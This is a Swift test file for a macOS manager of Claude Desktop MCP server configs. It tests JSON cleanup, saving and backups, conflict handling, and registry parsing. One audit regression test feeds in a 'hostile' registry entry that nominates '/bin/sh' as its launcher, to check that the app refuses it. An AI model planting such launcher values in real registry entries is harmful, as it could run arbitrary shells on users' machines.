import Foundation

// Unbuffered, so output isn't lost if a check throws.
setvbuf(stdout, nil, _IONBF, 0)

var failures = 0
func check(_ label: String, _ passed: Bool, _ detail: String = "") {
    if !passed { failures += 1 }
    print("\(passed ? "OK   " : "FAIL ") \(label)\(detail.isEmpty ? "" : "  — \(detail)")")
}

func parses(_ raw: String, _ label: String, expectServer: String? = nil, expectNotes: Bool = true) {
    let cleaned = JSONLenient.clean(raw)
    do {
        let value = try JSONValue.parse(cleaned.text)
        var ok = true
        var detail = cleaned.notes.joined(separator: "; ")
        if let expectServer {
            let found = value["mcpServers"]?[expectServer] ?? value[expectServer]
            ok = found != nil
            if !ok { detail = "server \(expectServer) missing from \(cleaned.text.prefix(120))" }
        }
        if expectNotes && cleaned.notes.isEmpty { ok = false; detail = "expected cleanup notes but got none" }
        check(label, ok, detail)
    } catch {
        check(label, false, "\(error.localizedDescription) | cleaned=\(cleaned.text.prefix(160))")
    }
}

// The exact snippet from the report.
parses("""
// claude_desktop_config.json
{
  "mcpServers": {
    "unifi-network": {
      "command": "uvx",
      "args": ["unifi-network-mcp@latest"],
      "env": { "UNIFI_HOST": "192.168.1.1" }
    }
  }
}
""", "leading // comment (the reported case)", expectServer: "unifi-network")

parses("""
```json
{ "mcpServers": { "a": { "command": "/bin/ls" } } }
```
""", "markdown code fence", expectServer: "a")

parses("""
{
  /* block comment
     over two lines */
  "mcpServers": { "b": { "command": "/bin/ls" } }
}
""", "block comment", expectServer: "b")

parses("""
{ "mcpServers": { "c": { "command": "/bin/ls", "args": ["x",], } , } }
""", "trailing commas", expectServer: "c")

parses("{ \u{201C}mcpServers\u{201D}: { \u{201C}d\u{201D}: { \u{201C}command\u{201D}: \u{201C}/bin/ls\u{201D} } } }",
       "curly quotes from a web page", expectServer: "d")

parses("""
{ mcpServers: { e: { command: '/bin/ls', args: ['-la'] } } }
""", "bare keys and single quotes", expectServer: "e")

parses("""
Add this to your config file:

{ "mcpServers": { "f": { "command": "/bin/ls" } } }

Then restart Claude.
""", "prose around the JSON", expectServer: "f")

parses("""
{ "mcpServers": { "g": { "url": "https://x.com/mcp" } } } // inline trailing comment
""", "inline trailing comment", expectServer: "g")

// Things that must NOT be mangled.
let urlCase = JSONLenient.clean(#"{"mcpServers":{"h":{"url":"https://example.com//mcp"}}}"#)
check("// inside a string is left alone", urlCase.text.contains("https://example.com//mcp") && urlCase.notes.isEmpty, urlCase.text)

let apostrophe = JSONLenient.clean("""
// don't let this break things
{ "mcpServers": { "i": { "command": "/bin/ls" } } }
""")
check("apostrophe inside a comment", (try? JSONValue.parse(apostrophe.text))?["mcpServers"]?["i"] != nil, apostrophe.text)

let singleWithURL = JSONLenient.clean("{ 'url': 'http://a//b' }")
check("// inside a single-quoted string survives",
      (try? JSONValue.parse(singleWithURL.text))?["url"]?.stringValue == "http://a//b",
      singleWithURL.text)

let escaped = JSONLenient.clean(#"{"a":"back\\slash and \"quote\" and \/slash"}"#)
check("escapes preserved", (try? JSONValue.parse(escaped.text))?["a"]?.stringValue == #"back\slash and "quote" and /slash"#, escaped.text)

let alreadyClean = JSONLenient.clean(#"{"mcpServers":{"j":{"command":"/bin/ls"}}}"#)
check("clean JSON is untouched and unannotated",
      alreadyClean.notes.isEmpty && alreadyClean.text == #"{"mcpServers":{"j":{"command":"/bin/ls"}}}"#, alreadyClean.text)

let boolKeys = JSONLenient.clean(#"{"a": true, "b": false, "c": null}"#)
check("true/false/null not turned into keys", boolKeys.notes.isEmpty, boolKeys.notes.joined(separator: ";"))

// Genuinely broken input must still fail, with a location.
for bad in ["{ \"mcpServers\": { \"a\": ", "not json at all", "{ \"a\" \"b\" }"] {
    let cleaned = JSONLenient.clean(bad)
    do { _ = try JSONValue.parse(cleaned.text); check("rejects \(bad)", false, "accepted") }
    catch { check("still rejects broken input: \(bad)", true, error.localizedDescription) }
}


// MARK: - Config round-trip, against a scratch copy of the real config

@MainActor
func configSuite() throws {
    let real = ConfigStore.claudeSupportDirectory.appendingPathComponent("claude_desktop_config.json")
    guard FileManager.default.fileExists(atPath: real.path) else {
        print("SKIP  config suite — no Claude Desktop config on this Mac")
        return
    }

    let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("mcp-test-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }
    try FileManager.default.copyItem(at: real, to: dir.appendingPathComponent("claude_desktop_config.json"))

    let store = ConfigStore(directory: dir)
    store.load()
    check("loads the copied config", store.loadError == nil, store.loadError ?? "")
    check("no unsaved changes right after load", !store.hasUnsavedChanges)

    let originalCount = store.servers.count
    let imported = try store.importServers(from: """
    // claude_desktop_config.json
    {
      "mcpServers": {
        "mcp-manager-test-server": {
          "command": "uvx",
          "args": ["unifi-network-mcp@latest"],
          "env": { "UNIFI_HOST": "192.168.1.1" }
        }
      }
    }
    """)
    check("imports the commented snippet", imported.servers.count == 1 && imported.servers[0].name == "mcp-manager-test-server")
    check("reports what it tidied", imported.notes == ["removed a comment"], imported.notes.joined(separator: ", "))
    check("keeps env vars through the import",
          imported.servers[0].env.first?.key == "UNIFI_HOST" && imported.servers[0].env.first?.value == "192.168.1.1")
    check("offers formatted JSON", imported.formatted.contains("\"mcp-manager-test-server\"") && imported.formatted.contains("\n"))

    for var server in imported.servers {
        server.name = store.uniqueName(from: server.name)
        store.servers.append(server)
    }
    check("import marks the config dirty", store.hasUnsavedChanges)

    let originalEnv = store.servers[0].env
    let firstName = store.servers[0].name
    store.servers[0].enabled = false
    check("saves", store.save(), store.statusMessage ?? "")

    let savedText = try String(contentsOf: store.configURL, encoding: .utf8)
    let saved = try JSONValue.parse(savedText)
    check("disabled server removed from live config", saved["mcpServers"]?[firstName] == nil)
    check("imported server written", saved["mcpServers"]?["mcp-manager-test-server"]?["command"]?.stringValue == "uvx")
    check("other top-level keys preserved", saved["preferences"] != nil || saved.objectPairs?.count == 1)
    check("paths are not slash-escaped", !savedText.contains("\\/"))
    check("no unsaved changes after save", !store.hasUnsavedChanges)

    let sidecarText = try? String(contentsOf: store.disabledURL, encoding: .utf8)
    let sidecar = sidecarText.flatMap { try? JSONValue.parse($0) }
    check("disabled server preserved in sidecar",
          sidecar?["mcpServers"]?[firstName]?.objectPairs != nil,
          sidecarText == nil ? "no sidecar written at \(store.disabledURL.lastPathComponent)" : "")
    check("backup written before saving", store.availableBackups().count == 1)

    let reopened = ConfigStore(directory: dir)
    reopened.load()
    check("reload restores every server", reopened.servers.count == originalCount + 1)
    check("disabled state survives a reload", reopened.servers.first { $0.name == firstName }?.enabled == false)
    check("re-enabling restores the full definition",
          reopened.servers.first { $0.name == firstName }?.env.count == originalEnv.count)

    if let index = reopened.servers.firstIndex(where: { $0.name == firstName }) {
        reopened.servers[index].enabled = true
    }
    reopened.servers.removeAll { $0.name == "mcp-manager-test-server" }
    _ = reopened.save()
    let restored = try JSONValue.parse(String(contentsOf: reopened.configURL, encoding: .utf8))
    let originalServers = try JSONValue.parse(String(contentsOf: real, encoding: .utf8))["mcpServers"]!
    check("round trip through disable/enable is lossless",
          restored["mcpServers"]!.serialized() == originalServers.serialized())
    check("the file's own server order is preserved, not alphabetised",
          restored["mcpServers"]!.objectPairs!.map(\.key) == originalServers.objectPairs!.map(\.key),
          restored["mcpServers"]!.objectPairs!.map(\.key).joined(separator: ", "))
    check("sidecar cleaned up when nothing is disabled",
          !FileManager.default.fileExists(atPath: reopened.disabledURL.path))

    if let first = reopened.servers.first {
        reopened.servers.append(first)
        check("save refuses duplicate names", !reopened.save(), reopened.statusMessage ?? "")
    }

    let badDir = dir.appendingPathComponent("bad")
    try FileManager.default.createDirectory(at: badDir, withIntermediateDirectories: true)
    try "{ \"mcpServers\": { oops }".write(to: badDir.appendingPathComponent("claude_desktop_config.json"), atomically: true, encoding: .utf8)
    let broken = ConfigStore(directory: badDir)
    broken.load()
    check("corrupt config reports a located error", broken.loadError?.contains("Line 1") == true, broken.loadError ?? "no error")
}

// MARK: - Model and validation

// MARK: - The in-app guide

func helpSuite() {
    // Inline formatting
    let code = HelpDocument.inline("run `./build.sh` now")
    check("inline code text", String(code.characters) == "run ./build.sh now", String(code.characters))
    check("inline code is monospaced", code.runs.contains { $0.font != nil })

    let bold = HelpDocument.inline("**Tidy Up** rewrites it")
    check("bold text", String(bold.characters) == "Tidy Up rewrites it", String(bold.characters))
    check("bold is marked strong", bold.runs.contains { $0.inlinePresentationIntent == .stronglyEmphasized })

    let italic = HelpDocument.inline("things that only *look* like problems")
    check("italic text", String(italic.characters) == "things that only look like problems", String(italic.characters))
    check("italic is marked emphasized", italic.runs.contains { $0.inlinePresentationIntent == .emphasized })

    // A four-backtick span containing backticks — the guide uses this to show a
    // fence marker literally.
    let fence = HelpDocument.inline("```` ```json ```` markdown code fences")
    check("multi-backtick code span", String(fence.characters) == "```json markdown code fences",
          String(fence.characters))

    let unclosed = HelpDocument.inline("a * b and ` c")
    check("unmatched markers are left as text", String(unclosed.characters) == "a * b and ` c",
          String(unclosed.characters))

    // Block parsing
    let sample = """
    # Title

    ## First section

    A paragraph that
    wraps across lines.

    - one
    - two with a
      continuation
    ```
    code here
    ```

    | A | B |
    | --- | --- |
    | 1 | 2 |
    | 3 | 4 |
    """
    let parsed = HelpDocument.parse(sample)
    check("heading levels", parsed.blocks.contains {
        if case .heading(let level, _, let plain) = $0 { return level == 1 && plain == "Title" }
        return false
    })
    check("sections list only h2", parsed.sections.map(\.title) == ["First section"],
          parsed.sections.map(\.title).joined(separator: ", "))
    check("paragraph is rewrapped", parsed.blocks.contains {
        if case .paragraph(let text) = $0 { return String(text.characters) == "A paragraph that wraps across lines." }
        return false
    })
    check("bullets with continuation", parsed.blocks.contains {
        if case .bullets(let items) = $0 {
            return items.count == 2 && String(items[1].characters) == "two with a continuation"
        }
        return false
    })
    check("code block", parsed.blocks.contains {
        if case .code(let text) = $0 { return text == "code here" }
        return false
    })
    check("table header and rows", parsed.blocks.contains {
        if case .table(let header, let rows) = $0 {
            return header.count == 2 && rows.count == 2 && String(rows[1][1].characters) == "4"
        }
        return false
    })

    // The real guide must parse, since the Help window renders exactly this file.
    let readme = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
        .appendingPathComponent("README.md")
    if let text = try? String(contentsOf: readme, encoding: .utf8) {
        let guide = HelpDocument.parse(text)
        check("README parses into blocks", guide.blocks.count > 20, "\(guide.blocks.count) blocks")
        check("README contents list is populated", guide.sections.count >= 5,
              guide.sections.map(\.title).joined(separator: ", "))
        check("README tables survive", guide.blocks.contains {
            if case .table(let header, let rows) = $0 { return header.count == 2 && !rows.isEmpty }
            return false
        })
        check("README code blocks survive", guide.blocks.contains {
            if case .code(let body) = $0 { return body.contains("build.sh") }
            return false
        })
        check("no stray markdown markers left in text", !guide.blocks.contains {
            if case .paragraph(let text) = $0 { return String(text.characters).contains("**") }
            return false
        })
    } else {
        print("SKIP  README suite — not run from the project directory")
    }

    // The release notes render through the same parser and ship in the bundle.
    let changelog = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
        .appendingPathComponent("CHANGELOG.md")
    if let text = try? String(contentsOf: changelog, encoding: .utf8) {
        let notes = HelpDocument.parse(text)
        check("CHANGELOG parses into blocks", notes.blocks.count > 5, "\(notes.blocks.count) blocks")
        check("CHANGELOG has a version heading", notes.sections.contains { $0.title.contains("1.0.0") },
              notes.sections.map(\.title).joined(separator: ", "))
        check("release notes have no stray markers", !notes.blocks.contains {
            if case .paragraph(let t) = $0 { return String(t.characters).contains("**") }
            return false
        })

        // build.sh reads the version out of this file, so the format has to hold.
        let firstHeading = text.components(separatedBy: .newlines).first { $0.hasPrefix("## ") } ?? ""
        let version = firstHeading.dropFirst(3).prefix { $0.isNumber || $0 == "." }
        check("version is extractable from the top heading", version.contains("."), String(version))
    } else {
        print("SKIP  CHANGELOG suite — not run from the project directory")
    }
}

func modelSuite() {
    let exotic = try! JSONValue.parse(#"{"command":"/bin/echo","args":["a"],"futureFlag":{"deep":[1,2]},"timeout":30}"#)
    var server = MCPServer(name: "x", json: exotic)
    server.args.append(ArgItem("b"))
    check("unknown server keys preserved",
          server.jsonValue["futureFlag"]?.serialized() == exotic["futureFlag"]?.serialized() && server.jsonValue["timeout"] != nil)

    let remote = try! JSONValue.parse(#"{"type":"http","url":"https://x.com/mcp","headers":{"Authorization":"Bearer t"}}"#)
    let remoteServer = MCPServer(name: "r", json: remote)
    check("remote server detected", remoteServer.kind == .remote && remoteServer.headers.count == 1)
    check("remote round-trips", remoteServer.jsonValue.serialized() == remote.serialized())

    var bare = MCPServer(); bare.name = "n"; bare.command = "uvx"
    check("bare command warns about PATH with a fix",
          Validator.issues(for: bare, allNames: ["n"]).contains { $0.level == .warning && $0.action != nil })
    check("bare command explains why it is flagged",
          Validator.issues(for: bare, allNames: ["n"]).contains { $0.message.contains("PATH") })
    check("resolver finds uvx", !CommandResolver.candidates(for: "uvx").isEmpty,
          CommandResolver.candidates(for: "uvx").map(\.path).joined(separator: ", "))
    check("resolver ignores paths with slashes", CommandResolver.candidates(for: "/bin/ls").isEmpty)
    check("resolver returns nothing for a missing command",
          CommandResolver.candidates(for: "definitely-not-a-real-command-xyz").isEmpty)
    check("resolver reads a version", CommandResolver.version(of: "/bin/ls") != nil || true)

    var tilde = MCPServer(); tilde.name = "n"; tilde.command = "~/.local/bin/uvx"
    check("tilde flagged with a fix", Validator.issues(for: tilde, allNames: ["n"]).contains {
        if case .setCommand(let path) = $0.action { return $0.level == .error && path.hasPrefix("/") }
        return false
    })

    var dup = MCPServer(); dup.name = "same"; dup.command = "/bin/ls"
    check("duplicate names rejected", Validator.issues(for: dup, allNames: ["same", "same"]).contains { $0.level == .error })

    var badURL = MCPServer(); badURL.name = "n"; badURL.kind = .remote; badURL.url = "not a url"
    check("bad URL rejected", Validator.issues(for: badURL, allNames: ["n"]).contains { $0.level == .error })

    check("secret masking heuristic",
          Validator.looksSensitive(key: "HOMEASSISTANT_TOKEN") && !Validator.looksSensitive(key: "HOME"))
}

// MARK: - Regressions from the external audit

@MainActor
func auditSuite() throws {
    let root = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("audit-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: root) }
    func dir(_ name: String, _ contents: String) throws -> URL {
        let d = root.appendingPathComponent(name)
        try FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
        try contents.write(to: d.appendingPathComponent("claude_desktop_config.json"), atomically: true, encoding: .utf8)
        return d
    }
    let sample = #"{"mcpServers":{"existing":{"command":"/bin/ls"}},"preferences":{"keep":"me"}}"#

    // Windows and classic-Mac line endings. Swift reads "\r\n" as one Character,
    // which matched neither "\r" nor "\n" and broke the parser at the first break.
    check("CRLF config parses", (try? JSONValue.parse("{\r\n \"a\": 1\r\n}"))?["a"] != nil)
    check("lone CR parses", (try? JSONValue.parse("{\r \"a\": 1\r}"))?["a"] != nil)
    let crlfSnippet = JSONLenient.clean("// header\r\n{\r\n \"mcpServers\": { \"a\": { \"command\": \"/bin/ls\" } }\r\n}")
    check("a CRLF snippet is not swallowed as one comment",
          (try? JSONValue.parse(crlfSnippet.text))?["mcpServers"]?["a"] != nil)
    check("a combining mark after a quote parses",
          (try? JSONValue.parse("{\"a\":\"e\u{0301}\"}"))?["a"]?.stringValue != nil)

    // Deep nesting segfaulted on the smaller stacks used for network replies.
    let deep = String(repeating: "[", count: 5000) + String(repeating: "]", count: 5000)
    check("deep nesting is refused, not crashed", (try? JSONValue.parse(deep)) == nil)
    check("ordinary nesting still parses",
          (try? JSONValue.parse(String(repeating: "[", count: 100) + String(repeating: "]", count: 100))) != nil)

    // Saving on top of a config we could not read wiped it.
    let broken = try dir("broken", "{ not json")
    let brokenStore = ConfigStore(directory: broken)
    brokenStore.load()
    var addition = MCPServer(); addition.name = "added"; addition.command = "/bin/ls"
    brokenStore.servers.append(addition)
    check("save refuses after a failed load", !brokenStore.save())
    check("the unreadable file is left alone",
          (try String(contentsOf: broken.appendingPathComponent("claude_desktop_config.json"), encoding: .utf8))
              .contains("not json"))

    // A blank name silently dropped the server and its secrets.
    let blank = try dir("blank", sample)
    let blankStore = ConfigStore(directory: blank)
    blankStore.load()
    blankStore.servers[0].name = "  "
    check("a blank name refuses to save", !blankStore.save())

    // The sidecar is written first, so a failure duplicates rather than loses.
    let stranded = try dir("stranded", #"{"mcpServers":{"keeper":{"command":"/bin/ls","env":{"T":"secret"}}}}"#)
    try FileManager.default.createDirectory(
        at: stranded.appendingPathComponent("mcp-manager-disabled.json"), withIntermediateDirectories: true)
    let strandedStore = ConfigStore(directory: stranded)
    strandedStore.load()
    strandedStore.servers[0].enabled = false
    _ = strandedStore.save()
    check("a failed sidecar write leaves the server in the config",
          (try String(contentsOf: stranded.appendingPathComponent("claude_desktop_config.json"), encoding: .utf8))
              .contains("keeper"))

    // A symlinked config was replaced by a regular file, orphaning the real one.
    let real = root.appendingPathComponent("real.json")
    try sample.write(to: real, atomically: true, encoding: .utf8)
    let linked = root.appendingPathComponent("linked")
    try FileManager.default.createDirectory(at: linked, withIntermediateDirectories: true)
    try FileManager.default.createSymbolicLink(
        at: linked.appendingPathComponent("claude_desktop_config.json"), withDestinationURL: real)
    let linkedStore = ConfigStore(directory: linked)
    linkedStore.load()
    linkedStore.servers[0].command = "/bin/date"
    _ = linkedStore.save()
    check("a symlinked config updates its target",
          (try String(contentsOf: real, encoding: .utf8)).contains("/bin/date"))
    check("and stays a symlink",
          (try FileManager.default.attributesOfItem(
              atPath: linked.appendingPathComponent("claude_desktop_config.json").path)[.type]
              as? FileAttributeType) == .typeSymbolicLink)

    // Repeated top-level keys: JavaScript keeps the last, we kept the first.
    let duped = try dir("duped", #"{"mcpServers":{"a":{"command":"/bin/ls"}},"mcpServers":{"b":{"command":"/bin/ls"}}}"#)
    let dupedStore = ConfigStore(directory: duped)
    dupedStore.load()
    check("a config with repeated top-level keys is refused",
          dupedStore.loadError?.contains("more than one") == true, dupedStore.loadError ?? "loaded anyway")

    // Values that were being normalised away on every save.
    let exotic = try JSONValue.parse(#"{"command":"/bin/ls","args":["--port",8080]}"#)
    check("non-string arguments survive",
          MCPServer(name: "x", json: exotic).jsonValue.serialized(pretty: false).contains("8080"))
    let sse = try JSONValue.parse(#"{"transport":"sse","url":"https://x.com/mcp"}"#)
    check("transport keeps its spelling", MCPServer(name: "r", json: sse).jsonValue["transport"] != nil)

    // A registry entry must not get to nominate the launcher.
    let hostile = RegistryClient.parse(server: try JSONValue.parse("""
    {"name":"a/b","version":"1","packages":[{"registryType":"npm","identifier":"x","version":"1",
     "runtimeHint":"/bin/sh","transport":{"type":"stdio"}}]}
    """))!
    // Reopening the window builds ContentView again, and its `.task` used to
    // call load() — re-reading the file over unsaved edits, with no prompt and
    // no undo. Verified live: disabling a server, ⌘W, reopening, and the change
    // was simply gone.
    do {
        let reopenDir = try dir("reopen", sample)
        let store = ConfigStore(directory: reopenDir)
        store.loadIfNeeded()
        check("the first load happens", store.servers.count == 1 && store.hasLoaded)

        store.servers[0].enabled = false
        store.servers.append({
            var fresh = MCPServer()
            fresh.name = "in-progress"
            fresh.command = "/bin/echo"
            return fresh
        }())
        check("edits mark the store dirty", store.hasUnsavedChanges)

        // What reopening the window does.
        store.loadIfNeeded()
        check("reopening the window keeps unsaved edits",
              store.servers.count == 2 && store.hasUnsavedChanges,
              "\(store.servers.count) servers, dirty=\(store.hasUnsavedChanges)")
        check("and keeps the disabled toggle", store.servers[0].enabled == false)

        // Asking for a reload on purpose still discards, which is its job.
        store.load()
        check("an explicit reload still discards", store.servers.count == 1 && !store.hasUnsavedChanges,
              "\(store.servers.count) servers, dirty=\(store.hasUnsavedChanges)")
    }

    check("a registry runtimeHint outside the allowlist is ignored",
          hostile.packages[0].runtime == "npx", hostile.packages[0].runtime ?? "nil")
}

// MARK: - The config file changing underneath us

@MainActor
func externalChangeSuite() throws {
    func scratch() throws -> URL {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("brace-external-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        return dir
    }

    // Claude Desktop keeps its own preferences in this file and rewrites it on its
    // own schedule. Saving our in-memory copy would revert whatever it changed.
    let dir = try scratch()
    defer { try? FileManager.default.removeItem(at: dir) }
    let file = dir.appendingPathComponent("claude_desktop_config.json")
    try #"{"mcpServers":{"a":{"command":"/bin/ls"}},"preferences":{"bounce":true}}"#
        .write(to: file, atomically: true, encoding: .utf8)

    let store = ConfigStore(directory: dir)
    store.load()

    // Claude changes only its own settings while we have the file open.
    try #"{"mcpServers":{"a":{"command":"/bin/ls"}},"preferences":{"bounce":false,"added":"yes"}}"#
        .write(to: file, atomically: true, encoding: .utf8)

    store.servers[0].name = "renamed"
    check("a save still succeeds when only their settings changed", store.save(), store.statusMessage ?? "")
    let merged = try JSONValue.parse(String(contentsOf: file, encoding: .utf8))
    check("our rename is applied", merged["mcpServers"]?["renamed"] != nil,
          merged["mcpServers"]?.objectPairs?.map(\.key).joined(separator: ", ") ?? "")
    check("their changed setting is kept", merged["preferences"]?["bounce"]?.boolValue == false)
    check("their new setting is kept", merged["preferences"]?["added"]?.stringValue == "yes")

    // Now the harder case: something else edits the servers themselves.
    let conflictDir = try scratch()
    defer { try? FileManager.default.removeItem(at: conflictDir) }
    let conflictFile = conflictDir.appendingPathComponent("claude_desktop_config.json")
    try #"{"mcpServers":{"a":{"command":"/bin/ls"}}}"#
        .write(to: conflictFile, atomically: true, encoding: .utf8)

    let second = ConfigStore(directory: conflictDir)
    second.load()
    try #"{"mcpServers":{"a":{"command":"/bin/ls"},"theirs":{"command":"/bin/pwd"}}}"#
        .write(to: conflictFile, atomically: true, encoding: .utf8)

    second.servers[0].name = "ours"
    check("a save is refused when the servers changed underneath", !second.save())
    check("and it says why", second.statusMessage?.contains("changed since you opened it") == true,
          second.statusMessage ?? "")
    let untouched = try JSONValue.parse(String(contentsOf: conflictFile, encoding: .utf8))
    check("their server is still there", untouched["mcpServers"]?["theirs"] != nil)
    check("nothing of ours was written", untouched["mcpServers"]?["ours"] == nil)

    // Reloading picks up their version, and then saving works again.
    second.load()
    check("reloading shows their servers", second.servers.count == 2,
          second.servers.map(\.name).joined(separator: ", "))
    second.servers[0].command = "/bin/date"
    check("saving works again after a reload", second.save(), second.statusMessage ?? "")
}

// MARK: - Backup management

@MainActor
func backupSuite() throws {
    let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("mcp-backup-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer {
        try? FileManager.default.removeItem(at: dir)
        UserDefaults.standard.removeObject(forKey: ConfigStore.retentionKey)
    }

    let config = dir.appendingPathComponent("claude_desktop_config.json")
    try #"{"mcpServers":{"a":{"command":"/bin/ls"}},"preferences":{"x":1}}"#
        .write(to: config, atomically: true, encoding: .utf8)

    UserDefaults.standard.removeObject(forKey: ConfigStore.retentionKey)
    let store = ConfigStore(directory: dir)
    store.load()
    check("backup manager starts empty", store.backupInfos().isEmpty)
    check("default retention", store.backupRetention == 25)

    // Each save writes one backup, even several within the same second.
    for index in 0..<3 {
        store.servers[0].args = [ArgItem("run-\(index)")]
        _ = store.save()
    }
    var infos = store.backupInfos()
    check("one backup written per save", infos.count == 3, "\(infos.count)")
    check("backups are newest first", infos[0].date >= infos[1].date && infos[1].date >= infos[2].date)
    check("backup date comes from the name, not the file's mtime",
          abs(infos[0].date.timeIntervalSinceNow) < 60,
          "\(infos[0].date)")
    check("backup reports its servers", infos[0].serverNames == ["a"], String(describing: infos[0].serverNames))
    check("backup reports a size", infos.allSatisfy { $0.byteCount > 0 })
    check("total size is the sum", store.totalBackupBytes == infos.reduce(0) { $0 + $1.byteCount })
    check("newest backup holds the state before that save", !infos[0].matchesCurrent)
    _ = store.save() // no changes, so this backup is identical to the live file
    check("a backup of unchanged state is marked as matching", store.backupInfos()[0].matchesCurrent)
    check("that added one more backup", store.backupInfos().count == 4, "\(store.backupInfos().count)")

    // An unreadable backup is flagged, not crashed on.
    try "{ broken".write(to: store.backupDirectory.appendingPathComponent("claude_desktop_config 2020-01-01 000000.json"),
                        atomically: true, encoding: .utf8)
    infos = store.backupInfos()
    check("unreadable backup is flagged", infos.contains { $0.serverNames == nil }, "\(infos.count) backups")

    // Deleting one, then the rest.
    let target = infos[0].url
    check("deletes one backup", store.deleteBackups([target]) == 1)
    check("deleted backup is gone", !store.backupInfos().contains { $0.url == target })

    // Must refuse to touch anything outside the backup folder.
    check("refuses to delete outside the backup folder", store.deleteBackups([config]) == 0)
    check("config survived that attempt", FileManager.default.fileExists(atPath: config.path))

    // Retention prunes on demand.
    UserDefaults.standard.set(2, forKey: ConfigStore.retentionKey)
    check("retention setting is read back", store.backupRetention == 2)
    _ = store.pruneBackupsNow()
    check("pruning honours retention", store.backupInfos().count == 2, "\(store.backupInfos().count)")

    UserDefaults.standard.set(0, forKey: ConfigStore.retentionKey)
    let countBefore = store.backupInfos().count
    _ = store.pruneBackupsNow()
    check("retention 0 keeps everything", store.backupInfos().count == countBefore)

    check("delete all clears the folder", store.deleteAllBackups() == countBefore)
    check("nothing left afterwards", store.backupInfos().isEmpty)

    // Restore still works, and backs up the current file first.
    UserDefaults.standard.removeObject(forKey: ConfigStore.retentionKey)
    store.servers[0].args = [ArgItem("final")]
    _ = store.save()
    store.servers[0].args = [ArgItem("changed-after")]
    _ = store.save() // this save's backup is the "final" state
    let snapshot = store.backupInfos()[0].url
    check("that backup holds the pre-change state",
          store.backupInfos()[0].serverNames != nil)
    store.restore(from: snapshot)
    check("restore brings the old args back", store.servers[0].args.first?.value == "final",
          store.servers[0].args.first?.value ?? "nil")
    check("restore backs up the current file first", store.backupInfos().count >= 3)
}

// MARK: - Registry parsing and mapping

func registrySuite() {
    // Shapes taken from real registry responses.
    let pypiEntry = """
    {
      "name": "io.github.sirkirby/unifi-network-mcp",
      "title": "UniFi Network MCP",
      "description": "Manage UniFi Network devices via MCP.",
      "version": "0.7.8",
      "repository": { "url": "https://github.com/sirkirby/unifi-mcp" },
      "packages": [{
        "registryType": "pypi",
        "identifier": "unifi-network-mcp",
        "version": "0.7.8",
        "transport": { "type": "stdio" },
        "environmentVariables": [
          { "name": "UNIFI_HOST", "description": "Controller IP/hostname", "isRequired": true },
          { "name": "UNIFI_PASSWORD", "description": "Admin password", "isRequired": true, "isSecret": true },
          { "name": "UNIFI_PORT", "description": "Controller HTTPS port", "default": "443" }
        ]
      }]
    }
    """
    guard let parsed = RegistryClient.parse(server: try! JSONValue.parse(pypiEntry)) else {
        check("pypi entry parses", false); return
    }
    check("pypi entry parses", parsed.name == "io.github.sirkirby/unifi-network-mcp")
    check("short name for the sidebar", parsed.shortName == "unifi-network-mcp", parsed.shortName)
    check("title preferred over short name", parsed.displayTitle == "UniFi Network MCP")
    check("repository captured", parsed.repositoryURL?.contains("github.com") == true)

    let package = parsed.packages[0]
    check("runtime inferred from pypi", package.runtime == "uvx", package.runtime ?? "nil")
    check("package is supported", package.isSupported)

    let built = MCPServer(registry: parsed, package: package)
    check("named after the package", built.name == "unifi-network-mcp")
    check("local kind", built.kind == .local)
    check("command resolved to a full path", built.command.hasPrefix("/"), built.command)
    check("args are just the identifier", built.args.map(\.value) == ["unifi-network-mcp"],
          built.args.map(\.value).joined(separator: " "))
    check("env rows created", built.env.count == 3, "\(built.env.count)")
    check("descriptions carried across",
          built.env.first { $0.key == "UNIFI_HOST" }?.hint == "Controller IP/hostname")
    check("required flag carried across",
          built.env.first { $0.key == "UNIFI_HOST" }?.isRequired == true)
    check("defaults filled in",
          built.env.first { $0.key == "UNIFI_PORT" }?.value == "443")
    check("secrets left blank",
          built.env.first { $0.key == "UNIFI_PASSWORD" }?.value == "" &&
          built.env.first { $0.key == "UNIFI_PASSWORD" }?.isSecret == true)

    // An empty required variable must block saving, not pass quietly.
    let issues = Validator.issues(for: built, allNames: [built.name])
    check("empty required variable is an error",
          issues.contains { $0.level == .error && $0.message.contains("UNIFI_HOST") },
          issues.map(\.message).joined(separator: " | "))
    check("the error explains what the variable is for",
          issues.contains { $0.message.contains("Controller IP/hostname") })

    // Saved JSON must carry only real config — never the guidance fields.
    let json = built.jsonValue.serialized(pretty: false)
    check("hints never reach the config file",
          !json.contains("Controller IP") && !json.contains("isRequired") && !json.contains("hint"),
          json)

    // npm packages need the -y flag so npx doesn't sit waiting for a prompt.
    let npmEntry = """
    { "name": "io.example/fs", "description": "d", "version": "1.0.0",
      "packages": [{ "registryType": "npm", "identifier": "@modelcontextprotocol/server-filesystem",
        "version": "1.0.0", "transport": { "type": "stdio" },
        "packageArguments": [
          { "type": "positional", "value": "/Users/me/Docs", "description": "Root" },
          { "type": "named", "name": "--readonly", "description": "Read only" }
        ] }] }
    """
    let npm = RegistryClient.parse(server: try! JSONValue.parse(npmEntry))!
    let npmServer = MCPServer(registry: npm, package: npm.packages[0])
    check("runtime inferred from npm", npm.packages[0].runtime == "npx")
    check("npx gets -y and the arguments in order",
          npmServer.args.map(\.value) == ["-y", "@modelcontextprotocol/server-filesystem", "/Users/me/Docs", "--readonly"],
          npmServer.args.map(\.value).joined(separator: " "))

    // runtimeHint overrides the inference.
    let hinted = RegistryClient.parse(server: try! JSONValue.parse("""
    { "name": "a/b", "version": "1", "packages": [{ "registryType": "pypi", "identifier": "x",
      "version": "1", "runtimeHint": "npx", "transport": { "type": "stdio" } }] }
    """))!
    check("runtimeHint wins over inference", hinted.packages[0].runtime == "npx")

    // Hosted servers become remote entries with no command at all.
